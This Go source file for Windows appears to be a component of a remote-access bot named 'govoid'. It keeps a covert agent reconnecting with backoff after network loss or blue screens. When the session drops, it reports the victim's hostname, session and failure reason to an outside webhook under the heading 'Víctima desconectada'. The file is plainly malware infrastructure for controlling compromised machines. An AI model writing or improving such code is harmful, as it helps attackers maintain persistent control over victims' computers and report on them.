//go:build windows

package bot

import (
	"context"
	"log/slog"
	"time"

	"github.com/local/govoid/internal/util"
)

const (
	// initialBackoff es el primer reintento. Tres segundos, no cinco: después
	// de un bugcheck la red aparece a trozos y cada segundo cuenta.
	initialBackoff = 3 * time.Second

	// maxBackoff acota la espera entre intentos. Un minuto, no cinco: el agente
	// no puede pasar cinco minutos dormido en una máquina que ya tiene red.
	maxBackoff = 60 * time.Second

	// stableAfter es cuánto tiene que durar una conexión para considerar que la
	// red está sana y reiniciar el backoff.
	stableAfter = 2 * time.Minute

	// notifyAfter son los fallos consecutivos antes de avisar por webhook. Tras
	// un bugcheck los dos primeros fallos son normales y no merecen ruido.
	notifyAfter = 2
)

// RunWithReconnect mantiene vivo el agente: espera red, lanza startFn y
// reintenta con backoff 3s → 6s → 12s → … → 60s. El backoff se resetea cuando
// la conexión duró más de dos minutos.
func RunWithReconnect(ctx context.Context, startFn func() error) {
	backoff := initialBackoff
	failures := 0

	for {
		if ctx.Err() != nil {
			return
		}

		util.WaitUntilOnline(ctx)
		if ctx.Err() != nil {
			return
		}

		hadSession := currentSession() != nil
		started := time.Now()
		err := startFn()

		if ctx.Err() != nil {
			return
		}

		markDisconnected()
		failures++

		reason := "conexión perdida"
		if err != nil {
			reason = err.Error()
		}
		slog.Debug("reconnect: sesión caída", "err", err, "intento", failures,
			"duracion_ms", time.Since(started).Milliseconds())

		// Aviso solo si de verdad había una sesión viva: en el arranque tras
		// pantalla azul los primeros intentos fallan por red y no son noticia.
		if hadSession && failures == notifyAfter {
			fields := []util.EmbedField{
				{Name: "hostname", Value: hostnameForWebhook(), Inline: true},
			}
			if session := currentSession(); session != nil {
				fields = append(fields, util.EmbedField{
					Name:   "sesion",
					Value:  formatSessionName(session.SessionNum),
					Inline: true,
				})
			}
			fields = append(fields, util.EmbedField{
				Name:   "motivo",
				Value:  reason,
				Inline: false,
			})
			_ = util.PostWebhook("⚠ Víctima desconectada (reconectando...)", 15158332, fields)
		}

		if time.Since(started) > stableAfter {
			backoff = initialBackoff
			failures = 0
		}

		select {
		case <-ctx.Done():
			return
		case <-time.After(backoff):
		}

		backoff *= 2
		if backoff > maxBackoff {
			backoff = maxBackoff
		}
	}
}
